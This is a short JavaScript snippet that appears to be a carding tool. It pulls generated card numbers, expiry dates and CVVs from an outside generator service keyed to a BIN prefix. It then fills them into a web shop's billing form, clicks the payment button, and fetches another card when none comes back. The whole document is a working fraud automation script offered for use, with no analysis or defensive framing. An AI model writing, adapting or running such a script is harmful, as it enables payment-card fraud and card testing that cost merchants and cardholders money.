var url = "https://altenen.herokuapp.com/bin?bin=4342562247xxxxxx&mon=12&year=19&cvv=937";
var options = {
     url:url,
     dataType: "jsonp"
};
var cards = function(arr) {
  var i = 0;
  var json = arr[i];

  if ( json ) {
    $("#dwfrm_root_billingpayment_paymentMethod_creditCard_number").val( json.card );

    $("#dwfrm_root_billingpayment_paymentMethod_creditCard_month").val(2).val( json.mon );

    $("#dwfrm_root_billingpayment_paymentMethod_creditCard_year").val("20" + json.year);

    $("#cvnmasked").val(json.cvv);

    $("#creditCardBtn").click();
  }
  else {
    $.ajax(options)
    .success(cards);
  }
}
$.ajax(options)
.success(cards);
